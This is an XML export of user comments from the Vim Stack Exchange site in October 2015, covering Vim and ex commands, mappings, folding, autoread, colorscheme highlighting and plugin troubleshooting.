  <row Id="7861" PostId="5140" Score="0" Text="E.g. This would remove 3rd column: `ex +'%norm 2WdW' '+%p' -scq! &lt;(echo 1 2 3 4 5)` in shell, but I want opposite, to print what was actually deleted." CreationDate="2015-10-16T16:00:11.573" UserId="467" />
  <row Id="7862" PostId="5082" Score="0" Text="Nice! Thank you for the follow-through! :)" CreationDate="2015-10-16T18:22:55.347" UserId="4922" />
  <row Id="7863" PostId="5082" Score="0" Text="Alright... that didn't solve it after all.. The problem is still there. Argh." CreationDate="2015-10-16T18:28:05.523" UserId="4854" />
  <row Id="7864" PostId="5140" Score="0" Text="Why don't you use other tools like awk?" CreationDate="2015-10-16T18:40:29.203" UserId="54" />
  <row Id="7866" PostId="177" Score="0" Text="FWIW, I find swap files annoying as well, and for a while I tried using `noswapfile` as suggested below. I eventually gave in and turned that off, though, because apparently the benefits outweigh the annoyances--buuuuuut I don't actually remember what convinced me to restore swap file usage. Probably my computer crashed and I was unable to restore some files that I'd lost, which would have been trivial with swap files turned on." CreationDate="2015-10-16T19:01:39.183" UserId="1060" />
  <row Id="7867" PostId="5082" Score="0" Text="I’m wondering if you tried to look through the output of [:scriptnames](http://vimdoc.sourceforge.net/htmldoc/repeat.html#:scriptnames). I mean I would try to look through the files and try to exclude them one by one.&#xA;&#xA;But before, I’d try `vim -u NONE` to skip rc files at all." CreationDate="2015-10-16T19:05:43.083" UserId="4922" />
  <row Id="7870" PostId="5135" Score="0" Text="The problem also occurs with just that setting. Using the trivial .vimrc http://paste.fulltxt.net/sov8ji, when I try opening http://paste.fulltxt.net/urbFS7i and scroll down by holding 'j', it gets sluggish essentially immediately. (Can you reproduce this? I have &quot;VIM - Vi IMproved 7.4&quot;, &quot;2:7.4.826-1&quot; from Debian amd64.) So I still claim this isn't any interaction with my other settings." CreationDate="2015-10-16T20:16:22.610" UserId="4819" />
  <row Id="7871" PostId="5135" Score="0" Text="By the way, the problem is not specific to `&lt;` and `&gt;`, just opening with http://paste.fulltxt.net/7BxA with `syntax on` and trying to scroll should be enough to bring vim to its knees. I would be puzzled if there's nothing that can be done for that..." CreationDate="2015-10-16T20:18:50.957" UserId="4819" />
  <row Id="7872" PostId="5140" Score="0" Text="@romainl The `awk` is more [stream oriented](http://vi.stackexchange.com/a/2692/467), so there are some limitations in more complex parsing scenarios. On the other side awk is quicker, as I did some [benchmarking](http://unix.stackexchange.com/a/236525/21471) recently, but I want to learn ex/vi more efficiently." CreationDate="2015-10-16T22:04:17.947" UserId="467" />
  <row Id="7873" PostId="5101" Score="2" Text="There are actually built-in bindings that start with `[` and `]` (in fact, `[[` and `]]` are among them), so they wouldn't show up with `:map [`." CreationDate="2015-10-17T01:28:23.200" UserId="64" />
  <row Id="7874" PostId="457" Score="1" Text="When you learn what `q/` and `q:` do, you'll probably consider them some of the most useful commands in Vim.  And yes, you _already_ know how to use them, you just don't know yet what they do.  Watch [this screencast](http://vimcasts.org/episodes/refining-search-patterns-with-the-command-line-window/) to find out." CreationDate="2015-10-17T06:10:09.593" UserId="2313" />
  <row Id="7875" PostId="2692" Score="0" Text="Can you please post an example of &quot;editing (multiple) files non-interactively&quot; operation that is simpler to achieve with `ex` than it is with `ed`, `sed`, or `awk`?" CreationDate="2015-10-17T06:20:32.717" UserId="2313" />
  <row Id="7876" PostId="5144" Score="0" Text="`:p` only works on single lines and does not understand multiline patterns. Therefore use ranges. That's what they are for and they are non-greedy by default. (This is also the way sed works)" CreationDate="2015-10-17T07:05:57.633" UserId="71" />
  <row Id="7877" PostId="2692" Score="0" Text="@SatoKatsura Added two practical usages which deals with multiple files." CreationDate="2015-10-17T11:00:38.373" UserId="467" />
  <row Id="7878" PostId="463" Score="0" Text="What I find `q:` most useful for is when I have experimented with some commands, and decided I want to export them to a script. I can just open up the command history window, and yank the lines I want to reuse in future." CreationDate="2015-10-17T11:54:08.023" UserId="630" />
  <row Id="7879" PostId="5146" Score="1" Text="`:call append('$', 'my string')` - not using a replace command though.  And by the way, `:r` is `read`, rather than replace." CreationDate="2015-10-17T12:56:22.743" UserId="2313" />
  <row Id="7880" PostId="5147" Score="0" Text="thanks, I thought this might have been the case, I just tried your first 2 options -  and they worked nicely! option 1 technique using `&quot;&gt;`  and then `n` to jump to next match is quite interesting, Ive noticed matches from searches tend to persist even after youve exited &quot;search&quot; mode. Ive just never been able to capitalise on it till now!" CreationDate="2015-10-17T12:56:26.263" UserId="4603" />
  <row Id="7881" PostId="5118" Score="2" Text="I use this to tell `K` to use Vim help when I'm editing Vim files: `autocmd BufReadPost {.vimrc,*.vim} setlocal keywordprg=:help` I'm not sure why that isn't a default!" CreationDate="2015-10-17T13:53:21.827" UserId="630" />
  <row Id="7882" PostId="5118" Score="1" Text="@joeytwiddle Sounds like a job for a `FileType` autocmd" CreationDate="2015-10-17T14:12:20.233" UserId="205" />
  <row Id="7883" PostId="5118" Score="0" Text="You're right @muru. It now looks a bit cleaner: `autocmd FileType vim setlocal keywordprg=:help`" CreationDate="2015-10-17T14:20:11.407" UserId="630" />
  <row Id="7884" PostId="5145" Score="0" Text="Although it's asking about selection *lengths*, I think the answers to [this question](http://vi.stackexchange.com/questions/2796/how-to-achieve-selection-different-length-of-texts-on-different-lines) will suit you." CreationDate="2015-10-17T14:28:10.853" UserId="630" />
  <row Id="7885" PostId="5147" Score="1" Text="It seems there is an exception to the &quot;rectangular selections&quot; rule, and that is when `$` is used while the visual selection spans lines of different lengths. I assume this is the only exception with the built-in functionality." CreationDate="2015-10-17T14:29:35.467" UserId="630" />
  <row Id="7886" PostId="5147" Score="0" Text="@joeytwiddle, yes you are right." CreationDate="2015-10-17T14:31:55.390" UserId="54" />
  <row Id="7887" PostId="788" Score="0" Text="I think you can drop the second `file` from your second commandline." CreationDate="2015-10-17T14:33:19.510" UserId="630" />
  <row Id="7888" PostId="5146" Score="0" Text="@SatoKatsura You're right, I've corrected the title. I think I got confused by: `:help r`." CreationDate="2015-10-17T17:01:34.253" UserId="467" />
  <row Id="7889" PostId="788" Score="0" Text="@joeytwiddle Done." CreationDate="2015-10-17T17:29:58.030" UserId="467" />
  <row Id="7891" PostId="5151" Score="0" Text="Thanks! it seems, though, that with this setting, it is no longer possible to create folds without this pattern with `:fold`." CreationDate="2015-10-17T18:43:15.597" UserId="4505" />
  <row Id="7892" PostId="5015" Score="3" Text="Teach children Vim as their first editor." CreationDate="2015-10-17T18:40:47.010" UserId="2295" />
  <row Id="7893" PostId="5154" Score="0" Text="See http://vim.wikia.com/wiki/Replace_a_builtin_command_using_cabbrev, also http://vi.stackexchange.com/q/4452/205" CreationDate="2015-10-18T03:28:45.873" UserId="205" />
  <row Id="7894" PostId="5157" Score="1" Text="For Vim, see: [`:help posix`](http://vimhelp.appspot.com/vi_diff.txt.html#posix) and [`:help 'compatible'`](http://vimhelp.appspot.com/options.txt.html#%27compatible%27). In brief, Vim is almost (but not 100%) compatible with both POSIX and the original vi." CreationDate="2015-10-18T06:30:42.887" UserId="51" />
  <row Id="7895" PostId="5161" Score="0" Text="After the visual mode finishes, use `gv` to reselect or simply manually use the marks `'&lt;,'&gt;` they are still valid even if visual mode was finished." CreationDate="2015-10-18T07:22:36.670" UserId="71" />
  <row Id="7896" PostId="5161" Score="0" Text="Ah!  Perfect.  That *is* an answer; you should post it as such.  :)" CreationDate="2015-10-18T07:25:35.367" UserId="4676" />
  <row Id="7897" PostId="5157" Score="0" Text="Read `:h vi_diff.txt`" CreationDate="2015-10-18T07:28:48.023" UserId="71" />
  <row Id="7898" PostId="5161" Score="0" Text="Okay, then I will do." CreationDate="2015-10-18T07:31:54.850" UserId="71" />
  <row Id="7899" PostId="5162" Score="0" Text="That's why I asked this question, I want to put all custom function at bottom. I see a lot of vimrc files online, they all put it at bottom. But it doesn't work for me." CreationDate="2015-10-18T08:11:06.540" UserId="1276" />
  <row Id="7900" PostId="5162" Score="1" Text="You can put functions at vimrc bottom, only if the functions are used *later* - e.g. when they are called in an `autocmd` event, which may be defined above. The important thing is that, at *call* time, `vimrc` was already parsed. That might have confused you." CreationDate="2015-10-18T08:53:10.213" UserId="1800" />
  <row Id="7901" PostId="5167" Score="0" Text="Perfect.  Everything I asked for.  :)" CreationDate="2015-10-18T10:18:32.553" UserId="4676" />
  <row Id="7902" PostId="5156" Score="0" Text="There is a caveat with the solution, and that is any time you press `h` and then `&lt;space&gt;`, it will be expanded to &quot;vert h&quot;." CreationDate="2015-10-18T16:39:06.477" UserId="865" />
  <row Id="7903" PostId="5171" Score="1" Text="Start with Vim's help: `:h mysyntaxfile-add`." CreationDate="2015-10-18T17:24:52.573" UserId="1800" />
  <row Id="7904" PostId="5170" Score="1" Text="Thank you very much! This feature was blind spot for me :)" CreationDate="2015-10-19T02:14:26.473" UserId="3290" />
  <row Id="7905" PostId="5174" Score="0" Text="Not quite; that just shows what links to what. That's not something that can be loaded back in as a syntax file." CreationDate="2015-10-19T03:32:34.967" UserId="3164" />
  <row Id="7906" PostId="5177" Score="1" Text="Not bad...I'll probably use that if no one comes up with anything better.  :)" CreationDate="2015-10-19T05:55:47.070" UserId="4676" />
  <row Id="7907" PostId="5177" Score="2" Text="@Wildcard I didn't realize how much I actually run into this use case without realizing it. Good question :) I've added it to my own vimrc as well." CreationDate="2015-10-19T05:57:01.910" UserId="3164" />
  <row Id="7908" PostId="5175" Score="2" Text="As I recall you can't do that, and even if you could, you'd be asking for a lot of trouble by doing it.  How about using a pretty printer to switch between your style and the &quot;official&quot; one.  If you're using `git` you might even be able to use hooks to make the changes apply transparently." CreationDate="2015-10-19T06:01:42.090" UserId="2313" />
  <row Id="7909" PostId="5177" Score="2" Text="I spent most of the day fixing a bunch of markdown.  Italics, inline code, header indentations, hyperlinks...all of them one character inserts.  :)  Actually your solution is perfect; I'm going to start using it now." CreationDate="2015-10-19T06:02:37.620" UserId="4676" />
  <row Id="7910" PostId="5174" Score="0" Text="It is exactly what you asked for: a snapshot of every current `hi`, linked or not. Now, there is no magical command to turn that into a proper colorscheme so you will have to do a bit of editing. And it so happens that Vim is pretty good at editing text." CreationDate="2015-10-19T06:06:58.860" UserId="54" />
  <row Id="7911" PostId="5174" Score="0" Text="That is not what I asked. Being pedantic doesn't help anything; you know what I meant." CreationDate="2015-10-19T06:07:47.553" UserId="3164" />
  <row Id="7912" PostId="5174" Score="0" Text="Revenge downvoting doesn't help either." CreationDate="2015-10-19T06:11:26.570" UserId="3164" />
  <row Id="7913" PostId="5174" Score="0" Text="Yes, that's exactly what you asked. I used that very command to create a flat clone of Solarized and it worked perfectly. If you don't want to dump your `hi whatever` commands don't ask how to dump them and ask what you want." CreationDate="2015-10-19T06:12:30.233" UserId="54" />
  <row Id="7914" PostId="5174" Score="0" Text="`aruaFunction   xxx links to Operator` isn't what I asked for. That doesn't include the `keyword` matches that comprise the `aruaFunction` match. So no, this isn't what I asked for. **Revenge downvoting is being a poor sport**." CreationDate="2015-10-19T06:13:29.600" UserId="3164" />
  <row Id="7915" PostId="5174" Score="0" Text="It is all you can get. Once you have that you'll need to edit the result to turn it into an actual colorscheme." CreationDate="2015-10-19T06:15:26.793" UserId="54" />
  <row Id="7916" PostId="5174" Score="0" Text="So you're saying it can't be done? Make that your answer then." CreationDate="2015-10-19T06:16:09.273" UserId="3164" />
  <row Id="7917" PostId="5178" Score="0" Text="I was going to &quot;post Q&amp;A style&quot; and make it a community wiki, but I realized when I expanded my question list a bit that I actually don't understand these nearly well enough to begin the wiki.  Maybe to clean up the wording a little once it's made." CreationDate="2015-10-19T06:24:44.307" UserId="4676" />
  <row Id="7918" PostId="5178" Score="1" Text="Did you read [this](http://stackoverflow.com/questions/26708822/why-do-vim-experts-prefer-buffers-over-tabs/26710166#26710166)?" CreationDate="2015-10-19T06:25:27.097" UserId="54" />
  <row Id="7919" PostId="4978" Score="0" Text="@Wildcard One day you might do a remap during a session." CreationDate="2015-10-19T06:30:54.843" UserId="1060" />
  <row Id="7920" PostId="5178" Score="0" Text="That's exactly the explanation I was hoping for...although I was hoping to get it written *here*.  (We want to get the site past beta!)  :)  Didn't realize it already existed.  Thanks for the link!" CreationDate="2015-10-19T06:33:15.823" UserId="4676" />
  <row Id="7921" PostId="5178" Score="0" Text="And didn't realize at first that you wrote it.  :)  I have some little follow up points I want to get clarified; I'll post them in the comments over there if I don't find the answers by reading through." CreationDate="2015-10-19T06:40:25.240" UserId="4676" />
  <row Id="7922" PostId="5178" Score="0" Text="Looks like buffers and arglist are the exact same thing.  That part was confusing me.  So you can't add a new buffer without adding to the arglist, and vice versa.  Correct?" CreationDate="2015-10-19T06:46:36.530" UserId="4676" />
  <row Id="7923" PostId="5173" Score="0" Text="You should improve the question to make it more clear what you want. Based on the question as it stands now, @romainl has given a good answer. However, as is clear from the (rather childish) discussion between you guys, what you ask is if there is a way to save the highlighting commands to a file for them to be sourced later on. This is really quite different." CreationDate="2015-10-19T07:01:36.453" UserId="21" />
  <row Id="7924" PostId="5173" Score="0" Text="Forget I asked." CreationDate="2015-10-19T07:02:17.460" UserId="3164" />
  <row Id="7925" PostId="5173" Score="0" Text="FWIW, I updated the question. I also added a new answer that might be more helpful." CreationDate="2015-10-19T07:11:11.903" UserId="21" />
  <row Id="7926" PostId="5178" Score="1" Text="No, the argument list is a subset of the buffer list." CreationDate="2015-10-19T07:56:51.993" UserId="54" />
  <row Id="7927" PostId="5176" Score="3" Text="You should perhaps consider using (or extending) the [vim-surround](https://github.com/tpope/vim-surround) plugin, in order to work on the text in a more *meaningful* way." CreationDate="2015-10-19T08:53:14.770" UserId="1800" />
  <row Id="7928" PostId="5180" Score="0" Text="For assign to variable you should use `let` keyword. `let put=expand(&quot;%&quot;)`" CreationDate="2015-10-19T11:02:01.153" UserId="1145" />
  <row Id="7929" PostId="5180" Score="1" Text="@AlexKroll, `:help :put`." CreationDate="2015-10-19T11:08:15.143" UserId="54" />
  <row Id="7930" PostId="5180" Score="0" Text="@romainl Yeh. If you exactly wont to put text into your buffer you should use function like `:call append(line('.'), expand(&quot;%&quot;))` it put result of `expand()` line bellow cursor." CreationDate="2015-10-19T11:11:53.350" UserId="1145" />
  <row Id="7931" PostId="5180" Score="0" Text="`:put` puts text from register like this `:let @x=expand(&quot;%&quot;) | put x`" CreationDate="2015-10-19T11:16:18.993" UserId="1145" />
  <row Id="7932" PostId="5180" Score="3" Text="@AlexKroll, so does `put=expand('%')`." CreationDate="2015-10-19T11:16:23.513" UserId="54" />
  <row Id="7933" PostId="5180" Score="0" Text="@romainl Yes! It's works." CreationDate="2015-10-19T11:19:03.603" UserId="1145" />
  <row Id="7934" PostId="5181" Score="0" Text="Try adjusting the `'cmdheight'` option before running the `global` command." CreationDate="2015-10-19T12:15:49.793" UserId="1800" />
  <row Id="7935" PostId="5186" Score="0" Text="Interesting, in both cases, with the `-u NONE` option and with my default configuration, checking the mapping returns `No Mapping Found`.  But &lt;c-x&gt; does work as expected with the `u NONE` option, but it does not work with my .vimrc file.  So, my assumption is to remove plug-ins one by one and see which one causes the issue." CreationDate="2015-10-19T13:54:17.640" UserId="3050" />
  <row Id="7936" PostId="5178" Score="3" Text="Initially each argument creates a buffer, but then buffers and arguments start having their own independent lives.  You can change the list of arguments with `:args` (which doesn't change buffers), and you can delete buffers, including the ones corresponding to arguments, with `:bdelete` (which doesn't affect the list of arguments).  Editing new files with `:e` creates new buffers, and so does, say, opening help, but neither changes the list of arguments.  And so on, and so forth; you can't rely on any relation between the two beyond startup." CreationDate="2015-10-19T14:15:51.573" UserId="2313" />
  <row Id="7937" PostId="5175" Score="1" Text="Not really possible. You could abuse folding for that, but you lose syntax highlighting in that case." CreationDate="2015-10-19T14:22:09.200" UserId="71" />
  <row Id="7938" PostId="5175" Score="0" Text="Yeah I wonder if someone might be able to come up with the way to abuse folding, I'm not sure that fold markers can be regexes." CreationDate="2015-10-19T15:11:11.850" UserId="390" />
  <row Id="7939" PostId="5189" Score="2" Text="You'll also want to make sure filetype plugins are enabled in your `.vimrc` with `filetype plugin on`." CreationDate="2015-10-19T15:54:57.163" UserId="2736" />
  <row Id="7940" PostId="5191" Score="0" Text="Isn't this information displayed bottom-left side of the window when you are in visual-mode ?" CreationDate="2015-10-19T16:58:27.067" UserId="1453" />
  <row Id="7941" PostId="5191" Score="6" Text="If you do `:set showcmd` Vim will also display the number of lines visually selected." CreationDate="2015-10-19T17:06:53.503" UserId="71" />
  <row Id="7942" PostId="5175" Score="0" Text="You don't need markers for folding. `:h fold-expr` and `:h 'fdm'`" CreationDate="2015-10-19T17:08:35.210" UserId="71" />
  <row Id="7943" PostId="5186" Score="0" Text="Maybe a plugin changed some of the `timeout`/`timeoutlen`, `ttimeout`/`ttimeoutlen` values and your `&lt;c-x&gt;` simply times out very quickly." CreationDate="2015-10-19T17:30:46.010" UserId="1800" />
  <row Id="7944" PostId="5193" Score="1" Text="`set` can take any number of settings. Something like `set tw=79 nowrap formatoptions+=j` will work. No need for a `|` (unless you want to call a different command, of course) ;-)" CreationDate="2015-10-19T19:38:10.667" UserId="51" />
  <row Id="7945" PostId="5183" Score="0" Text="Thank you; works well (+1). However, do you have any idea why I get the prompt for this command (my first question)? And why only when it matches thrice?" CreationDate="2015-10-19T20:50:57.477" UserId="1278" />
  <row Id="7947" PostId="5181" Score="0" Text="@VanLaser This works well. I do `set cmdheight=2` before the command, then `set cmdheight=1` after. I'd upvote if it were an answer." CreationDate="2015-10-19T20:57:54.657" UserId="1278" />
  <row Id="7948" PostId="5181" Score="0" Text="I've also found references to both answers [here](http://vim.wikia.com/wiki/Avoiding_the_%22Hit_ENTER_to_continue%22_prompts)." CreationDate="2015-10-19T20:58:36.733" UserId="1278" />
  <row Id="7949" PostId="5181" Score="0" Text="It's ok :) the `silent` answer is actually better/shorter." CreationDate="2015-10-19T21:46:31.367" UserId="1800" />
  <row Id="7950" PostId="5181" Score="0" Text="@VanLaser I actually quite like yours too, because it still notifies in case of error. `silent` (obviously) gives no indication if a command has failed." CreationDate="2015-10-19T22:07:02.853" UserId="1278" />
  <row Id="7951" PostId="5190" Score="0" Text="thanks for the answer, but i alredy knew that and i alreqdy have that." CreationDate="2015-10-19T22:32:11.663" UserId="1819" />
  <row Id="7952" PostId="5183" Score="0" Text="@Sparhawk As already mentioned in comments to your question, when the output exceeds the value of 'cmdheight' it causes the hit-enter prompt. Vim does this to ensure you see ask the output. Since you don't care about the output, :silent is the right way to avoid the prompt." CreationDate="2015-10-19T22:43:56.690" UserId="15" />
  <row Id="7953" PostId="3686" Score="0" Text="To any register: http://stackoverflow.com/questions/916875/yank-file-name-path-of-current-buffer-in-vim" CreationDate="2015-10-20T08:56:12.837" UserId="2038" />
  <row Id="7954" PostId="5197" Score="4" Text="*if you squint a little bit* ;-)" CreationDate="2015-10-20T10:24:25.817" UserId="54" />
  <row Id="7955" PostId="5196" Score="0" Text="There is a vim option that allows the h and l keys to wrap to the previous/next line when at the beginning/end of a line.  I'll post it as an answer when I have time." CreationDate="2015-10-20T12:19:03.667" UserId="865" />
  <row Id="7956" PostId="5181" Score="0" Text="Actually, `silent` doesn't mask errors.  Errors are only suppressed if you use `silent!`." CreationDate="2015-10-20T15:02:33.950" UserId="15" />
  <row Id="7957" PostId="5197" Score="1" Text="I see control e and control y as both being &quot;sort of to the left of the control d and control u keys they're related to&quot;." CreationDate="2015-10-20T16:18:52.347" UserId="859" />
  <row Id="7958" PostId="5181" Score="0" Text="Perhaps &quot;error&quot; isn't the correct term. I meant the feedback that it had failed. (Having said that, this is what I asked for in the original question, so yours is the correct answer!)" CreationDate="2015-10-20T21:16:25.543" UserId="1278" />
  <row Id="7959" PostId="5206" Score="0" Text="&quot;Completion&quot;, not &quot;autocompletion&quot;." CreationDate="2015-10-21T08:01:08.833" UserId="54" />
  <row Id="7960" PostId="5206" Score="0" Text="ok, updated question, thanks" CreationDate="2015-10-21T08:06:46.707" UserId="4603" />
  <row Id="7961" PostId="5208" Score="0" Text="aha! great spotting @romainl - when setting up the regex, I thought the `.\1` backreference  was inserted at the *end* of each line in the ctags file - and hence that was what ctag completion was based on, I removed the dot and bam its working! hah Ive spent hours messing around with this!!" CreationDate="2015-10-21T09:05:26.660" UserId="4603" />
  <row Id="7962" PostId="5208" Score="0" Text="Thanks for the link to your ctags too. Im giving your config for javascript a try and its  working nicely for completion and jumping to definition . Im also using tern for javascript completion - so far the two seem to go together quite well !" CreationDate="2015-10-21T09:51:30.900" UserId="4603" />
  <row Id="7963" PostId="5207" Score="0" Text="Agree with your last sentence.  If the output is that long, the filtering should be done directly from the command line, not from within ex." CreationDate="2015-10-21T10:10:48.807" UserId="4676" />
  <row Id="7964" PostId="5208" Score="0" Text="Cool, glad it helps." CreationDate="2015-10-21T12:02:32.133" UserId="54" />
  <row Id="7965" PostId="5207" Score="0" Text="Sorry, don't see what you mean about too long list. E.g. syntastic has in that list 10 files, nerdtree another 13 files, etc." CreationDate="2015-10-21T12:52:55.887" UserId="1378" />
  <row Id="7966" PostId="5207" Score="1" Text="If the output of your `:scriptnames` is longer than Magna Carta you might consider installing Tim Pope's [scriptease](https://github.com/tpope/vim-scriptease).  It provides a function `:Scriptnames` that puts all that junk in a quickfix list. There you can search it to your heart's content, save it to a file, or go to the corresponding scripts." CreationDate="2015-10-21T13:39:42.517" UserId="2313" />
  <row Id="7967" PostId="5207" Score="0" Text="@AlBerger, a list too long means too many plugins and/or plugins too large or poorly written. 13 files for a single plugin is way too much." CreationDate="2015-10-21T14:21:29.920" UserId="54" />
  <row Id="7968" PostId="5207" Score="0" Text="Are you suggesting that `NERDTree` should put all its functions in a single file, in order to keep the output of `:scriptnames` short?  Would that make it a better written plugin?" CreationDate="2015-10-21T15:31:27.690" UserId="2313" />
  <row Id="7969" PostId="5191" Score="0" Text="You can also add `:set showcmd` to your .vimrc. Should be automatically on if `nocompatible` is set. http://vimhelp.appspot.com/options.txt.html#%27showcmd%27" CreationDate="2015-10-21T15:41:00.583" UserId="4993" />
  <row Id="7970" PostId="5154" Score="0" Text="garyjohn answered your question perfectly but thought I'd add a more general 'no, not horizontal, vertical' mapping. `map &lt;leader&gt;v &lt;C-W&gt;&lt;S-L&gt;` I use it often, including for `:h`." CreationDate="2015-10-21T15:56:58.597" UserId="4993" />
  <row Id="7971" PostId="5023" Score="0" Text="Wait, you &quot;use Vim because it has a very small footprint&quot; inside of *Virtual Box VM*?? ;)" CreationDate="2015-10-21T16:05:26.857" UserId="4993" />
  <row Id="7972" PostId="5026" Score="0" Text="+1. I had the same experience and couldn't agree more. When you have work to complete, switching to any new editor can be painful/impossible. Don't know about just handing over a .vimrc but explaining what it is and helping a new user set a few defaults for their style of working can not only help them be productive quickly but also serves as a way start to expose part of vi(m)'s magic." CreationDate="2015-10-21T16:11:17.490" UserId="4993" />
  <row Id="7973" PostId="5023" Score="0" Text="@Will Yep. I have a VM that takes up something like 2 GB or less. I would rather install an entire operating system, VIM, and all of my other tools than install a 4GB or whatever copy of Microsoft Tools. The VM itself can expand if I need it to, but that hasn't happened yet since I work mostly with text files when dealing with that particular computer. If I was using FreeBSD, I could potentially run an even smaller footprint and probably run the whole VM in under a gig." CreationDate="2015-10-21T16:47:21.233" UserId="1417" />
  <row Id="7974" PostId="5023" Score="2" Text="Office 365 Requires UP TO 6GB of hard drive space and UP TO 4GB of ram. I can run an entire linux OS using 4GB of HD space and 1028MB of ram. Less if I want to push things. I have run FREEBSD in a VM and only gave it 256MB of ram. VIM for me replaces Office but in addition, a full OS install gives me many more tools than Office provides in less foot print. I hope that makes sense." CreationDate="2015-10-21T16:54:14.187" UserId="1417" />
  <row Id="7975" PostId="5214" Score="1" Text="Very nice, thank you for posting this!" CreationDate="2015-10-21T18:34:16.460" UserId="2313" />
  <row Id="7976" PostId="5214" Score="0" Text="You're welcome! I have this crazy idea of a 'vim-dwim' plugin that acts differently based on syntax under cursor (e.g. when hitting Enter), and I think I'll heavily inspire myself from this plugin. If I ever get to start making it, that is." CreationDate="2015-10-21T18:42:47.537" UserId="1800" />
  <row Id="7977" PostId="5220" Score="4" Text="[vim-speeddating](https://github.com/tpope/vim-speeddating) might help." CreationDate="2015-10-21T20:58:14.517" UserId="51" />
  <row Id="7979" PostId="5218" Score="1" Text="Just curious: Those braces are redundant. What benefit do they provide?" CreationDate="2015-10-22T03:02:59.953" UserId="205" />
  <row Id="7980" PostId="5217" Score="0" Text="Oh, It's what I was looking for. But I have a small problem. Can you fix it? https://github.com/sagarrakshe/toggle-bool/issues/1" CreationDate="2015-10-22T04:57:00.560" UserId="500" />
  <row Id="7981" PostId="4748" Score="1" Text="See http://vi.stackexchange.com/questions/2046/how-can-i-integrate-gdb-with-vim?rq=1 for some possible answers" CreationDate="2015-10-22T06:05:48.327" UserId="4987" />
  <row Id="7982" PostId="4748" Score="0" Text="Thanks, @michaelavila, I think ConqueGDB seems interesting." CreationDate="2015-10-22T07:33:00.600" UserId="21" />
  <row Id="7983" PostId="5223" Score="0" Text="&quot;Since all keys on the keyboard already have something else more important and powerful to do, this option seems plain impossible&quot;. Not true; there are several unused keys, and some which are arguably less powerful/important which could be remapped to require the leader key, freeing them up for something genuinely important." CreationDate="2015-10-22T11:42:17.100" UserId="859" />
  <row Id="7984" PostId="5222" Score="0" Text="Maybe you accidentally selected &quot;Consolas bold&quot; as the font for your terminal?" CreationDate="2015-10-22T11:46:34.667" UserId="51" />
  <row Id="7985" PostId="760" Score="0" Text="One thing you can do to make editing :let @a=   type commands more easily editable is to type : &lt;Ctrl-f&gt;, select and edit the line concerned (the last line, which it defaults to, if you're editing the last line you entered) using vim as usual. Hit return when you're done to execute the line, or &lt;Ctrl-c&gt; to exit." CreationDate="2015-10-22T11:57:13.673" UserId="859" />
  <row Id="7986" PostId="5223" Score="0" Text="Thanks @Alex, you're right, I rephrased that part. Which unused keys do you think might be a good fit for such functionality, or which existing key does something less important?" CreationDate="2015-10-22T12:07:29.373" UserId="135" />
  <row Id="7987" PostId="5223" Score="0" Text="Well, the key I use when testing a mapping is the backspace key, and it's not a bad choice for an operation which performs a deletion (currently i have it set to perform a line deletion without altering the registers usually used by such an action, so i can copy/cut some text,  delete lines using backspace, then paste the original text)." CreationDate="2015-10-22T12:11:07.000" UserId="859" />
  <row Id="7988" PostId="5225" Score="0" Text="http://vi.stackexchange.com/questions/2702/how-can-i-make-vim-autoread-a-file-while-it-doesnt-have-focus" CreationDate="2015-10-22T12:43:35.467" UserId="54" />
  <row Id="7989" PostId="5218" Score="0" Text="@muru There are no advantages, but it does make a difference, so depends on the code intent.  Braces control the scope, therefore make it possible to have variables local to the case with braces.  For this reason, I consistently add braces, in some cases, when local to the case variable is added, its scope is limited." CreationDate="2015-10-22T13:11:10.547" UserId="3050" />
  <row Id="7990" PostId="5221" Score="0" Text="after doing some more digging, you are correct, this is the `auto-indent`, not `auto-format`.  A lot of VIM keyboard cheat sheets call the `=` key `auto-format`.  Anyway, the l1 option works great..." CreationDate="2015-10-22T13:55:06.147" UserId="3050" />
  <row Id="7991" PostId="5228" Score="0" Text="Not that I know of, but you could try something like this to fix it: `:%s/[^ ,]\zs\ze\n\s*[^ }]/,/`." CreationDate="2015-10-22T14:31:52.450" UserId="2313" />
  <row Id="7993" PostId="5224" Score="0" Text="Can you provide an example of one or more of your indent rules? It's not clear what you are sking." CreationDate="2015-10-22T14:59:30.407" UserId="4413" />
  <row Id="7995" PostId="5226" Score="0" Text="AFAIK gVim does an additional check when the window holding a file gets focus. This helps to discover changed files early, as most often they're changed as the result of a user action elsewhere." CreationDate="2015-10-22T15:11:50.927" UserId="5005" />
  <row Id="7996" PostId="5226" Score="0" Text="Thanks for pointing me to `:checktime`, I found [this answer](http://stackoverflow.com/a/927634/1333025) on SO which suggests a solution." CreationDate="2015-10-22T15:13:24.350" UserId="5005" />
  <row Id="7997" PostId="5226" Score="0" Text="@PetrPudlák very few features are restricted to the gui version (mostly font and other display options). It is more likely that you have some option (such as  `'autoread'`) or autocmd (such as `FileChangedShellPost`), or that the versions of Vim and gVim are different. You can compare the options using `:set` and autocommands using `:au` and redirecting the output as explained in [this question](http://vi.stackexchange.com/questions/5205/)." CreationDate="2015-10-22T16:59:49.347" UserId="1405" />
  <row Id="7998" PostId="5226" Score="0" Text="I found it: In `:help timestamp` (my emphasis): After a shell command is run (:!cmd suspend :read! K) timestamps, file modes and file sizes are compared for all buffers in a window. Vim will run any associated FileChangedShell autocommands or display a warning for any files that have changed. *In the GUI this happens when Vim regains input                                                                   &#xA;focus.*" CreationDate="2015-10-22T17:25:44.937" UserId="5005" />
  <row Id="7999" PostId="5232" Score="0" Text="I did just try `:.,$norm gqq` but it only does about half of the lines, and I had to repeat this a lot." CreationDate="2015-10-22T18:17:27.780" UserId="3303" />
  <row Id="8000" PostId="5226" Score="0" Text="@PetrPudlák maybe I missed something, but my understanding is that the same behavior (autocommands or warnings) occurs both on console and GUI; in the GUI the behavior is postponed until it gain focus." CreationDate="2015-10-22T19:08:36.137" UserId="1405" />
  <row Id="8001" PostId="5224" Score="0" Text="Better? Rule being a indent file that (to my understanding) does the formatting when you indent lines." CreationDate="2015-10-22T19:45:42.337" UserId="4751" />
  <row Id="8002" PostId="5237" Score="0" Text="Why'd they recommend against it?" CreationDate="2015-10-22T21:19:55.490" UserId="3128" />
  <row Id="8003" PostId="5237" Score="0" Text="I'll see if I can find it..." CreationDate="2015-10-22T21:20:08.977" UserId="306" />
  <row Id="8004" PostId="5237" Score="0" Text="It's in the comments to the accepted answer in the SO post I edited in." CreationDate="2015-10-22T21:24:01.117" UserId="306" />
  <row Id="8005" PostId="5232" Score="1" Text="`:.,$!grep -oP '\w+'` is probably faster.  `gqG` should work too (but it will take some time...). Bonus : `:.,$! fmt`" CreationDate="2015-10-22T22:09:45.243" UserId="3002" />
